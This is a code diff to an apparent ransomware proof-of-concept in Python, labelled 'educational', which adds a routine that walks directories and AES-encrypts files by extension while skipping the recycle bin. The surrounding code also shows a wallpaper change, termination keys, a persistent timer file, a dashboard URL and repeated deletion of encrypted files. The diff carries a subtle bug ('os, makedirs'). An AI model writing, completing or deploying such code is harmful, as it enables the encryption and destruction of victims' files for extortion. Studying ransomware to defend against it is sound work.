@@ -4,30 +4,20 @@ Author: Yakuza-D
 Disclaimer: this app written only and only for educational purpose
 """
 
+import ctypes
+import logging
 import os
 import sys
+import uuid
 from os import makedirs
 
-import requests
-import json
 from Crypto.Cipher import AES
 from Crypto.Protocol.KDF import PBKDF2
 from Crypto.Random import get_random_bytes
-from Crypto.Util.Padding import pad, unpad
-import base64
-import uuid
-from datetime import datetime, timedelta
-import time
-import ctypes
-import logging
-import threading
-import tkinter as tk
-from tkinter import filedialog, messagebox, simpledialog
-from tkinter import ttk
-from PIL import Image, ImageTk
-
+from Crypto.Util.Padding import pad
 
 """ Part 1: Application functions """
+
 
 # Defining Function to load the current path of ransom.py and then join it to relative_path
 def resource_path(relative_path):
@@ -36,6 +26,7 @@ def resource_path(relative_path):
 
     # join relative_path to directory name of the current python file
     return os.path.join(basePath, relative_path)
+
 
 # Create Function to Ensure the time Directory Exist
 def ensure_time_dir_exist():
@@ -65,8 +56,6 @@ def load_machine_id():
     return None
 
 
-
-
 """ Part 2: Define Global constants """
 TERMINATION_KEY = "bingo"  # Termination keys used to close app and cancel Deleting Operation
 # TERMINATION_KEY = "yakuza"
@@ -77,7 +66,7 @@ SECONDARY_TERMINATION_KEY = "stop"
 HOME_DIR = os.path.expanduser('~')
 
 # Create Path of Time Directory based on the current user's home directory
-TIME_DIR = os.path.join(HOME_DIR, '.cryptolock_time') # TIME_DIR = os.path.join(HOME_DIR, '.yakuzalock_time')
+TIME_DIR = os.path.join(HOME_DIR, '.cryptolock_time')  # TIME_DIR = os.path.join(HOME_DIR, '.yakuzalock_time')
 
 # Create Path of a timer state file(timer_state.txt) which store in the TIME_DIR
 TIMER_STATE_FILE = os.path.join(TIME_DIR, 'timer_state.txt')
@@ -86,7 +75,6 @@ TIMER_STATE_FILE = os.path.join(TIME_DIR, 'timer_state.txt')
 ICON_PATH = resource_path("img/app_icon.ico")
 LOGO_PATH = resource_path("img/logo.png")
 THANKS_PATH = resource_path("img/thank_you.png")
-
 
 """ Part 3: Define Encryption Configs as Global Constants """
 
@@ -111,7 +99,6 @@ MAX_ATTEMPTS = 10
 # Delay between each round of encrypted files Deleting
 DELAY = 5
 
-
 """  Part 4: Setup Logging to Log the Encryption/Decryption Process in the Log Console """
 logging.basicConfig(
     filename="encryption_log.txt",
@@ -126,9 +113,10 @@ formatter = logging.Formatter("%(asctime)s:%(levelname)s:%(message)s")
 consoleHandler.setFormatter(formatter)
 logging.getLogger().addHandler(consoleHandler)
 
+
 # Initialize Encryption Tool Class
 class EncryptionTool:
-    def __init__(self, drives, extensions, password, dashboard_url, max_attempts=10, delay = 5):
+    def __init__(self, drives, extensions, password, dashboard_url, max_attempts=10, delay=5):
         self.drives = drives
         self.extensions = extensions
         self.password = password
@@ -138,7 +126,7 @@ class EncryptionTool:
         self.key = self.generate_key(password)
         self.machine_id = str(uuid.uuid4())
 
-    #@staticmethod
+    # @staticmethod
     def generate_key(self, password):
         """ this function generates a key from the password as argument which is PASSWORD_PROVIDED
         :param: password
@@ -167,15 +155,14 @@ class EncryptionTool:
             ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
             logging.info(f"[+] Wallpaper Set Successfully to {path}. ")
         except Exception as e:
-            logging.error(f"[-] Wallpaper Set Failed: Error {str(e)}")
-
+            logging.error(f"[-] Failed to set Wallpaper => Error: {str(e)}")
 
     # Function to Create Important Files on the target machine
     def create_important_files(self, directory_path):
         try:
             # Create a path of D-Data and then Create it if the D-Data directory doesn't exist
             dDataPath = os.path.join(directory_path, "D-Data")
-            os,makedirs(dDataPath, exist_ok=True)
+            os, makedirs(dDataPath, exist_ok=True)
 
             # Filenames must be created with fileContents
             filenames = ['Annual_Report_2022.docx', 'Financials_Q3.xlsx', 'Employee_Contacts.pdf']
@@ -194,8 +181,7 @@ class EncryptionTool:
             logging.info(f"[+] Important Files Created Successfully in {dDataPath}.")
         except Exception as e:
             # Submit Error Log message from exception occurs
-            logging.error(f"Failed to create important files: {str(e)}")
-
+            logging.error(f"[-] Failed to create important files => Error: {str(e)}")
 
     # Create Function to Encrypt a Single File
     def encrypt_file(self, file_path):
@@ -211,7 +197,7 @@ class EncryptionTool:
                 fileData = file.read()
 
             # Encrypt fileData using the Cipher object with AES Algorithm
-            encryptedData =cipher.encrypt(pad(fileData, AES.block_size))
+            encryptedData = cipher.encrypt(pad(fileData, AES.block_size))
 
             # Write the encryptedData + iv to a new file with .encrypted Extension
             with open(file_path + ".encrypted", 'wb') as file:
@@ -223,15 +209,38 @@ class EncryptionTool:
             # Submit an Info Log from encryption to Log Console
             logging.info(f"[+] Encrypting {file_path} ...")
         except Exception as e:
-            #Submit an Error Log from encryption to Log Console
-			logging.error(f"[-] Failed to encrypt {file_path}: Error: {str(e)}")
+            # Submit an Error Log from encryption to Log Console
+            logging.error(f"[-] Failed to encrypt {file_path} => Error: {str(e)}")
 
+    # Function to Encrypt All Files in a Directory
+    def encrypt_files_in_directory(self, directory_path):
+        try:
+            # Split root(parents) directory, directory and files in directory
+            for root, dirs, files in os.walk(directory_path):
 
+                # If the directory uses fore recycle bin, jump to for loop
+                if "$RECYCLE.BIN" in root:
+                    continue
 
+                # Iterate on all files in directory, for each file in directory
+                for file in files:
+                    # if a file ends with each item defined in the extension list, then join filename to the root folder
+                    # and then encrypt file using single file encrypt function => encrypt_file()
+
+                    if any(file.endswith(ext) for ext in self.extensions):
+                        # join a file to the root directory and then encrypt file using single file encrypt function
+                        filePath = os.path.join(root, file)
+                        self.encrypt_file(filePath)
+
+            # Submit Info Log for files encryption in the Log Console
+            logging.info(f"[+] All files in the {directory_path} Encrypted Successfully.")
+        except Exception as e:
+            # Submit Error Log for files encryption in the Log Console
+            logging.error(f"[-] Failed to encrypt files in {directory_path} => Error: {str(e)}")
 
 
 if __name__ == "__main__":
     # Create an instance of the EncryptionTool class
     encryptionTool = EncryptionTool(drives=DRIVES_TO_ENCRYPT, extensions=EXTENSION_TO_ENCRYPT,
                                     password=PASSWORD_PROVIDED, dashboard_url=DASHBOARD_URL)
-    # encryptionTool.create_important_files(r"H:/Repo/RansomPOC/test")
+    encryptionTool.encrypt_files_in_directory(r"H:/Repo/RansomPOC/D-Data")
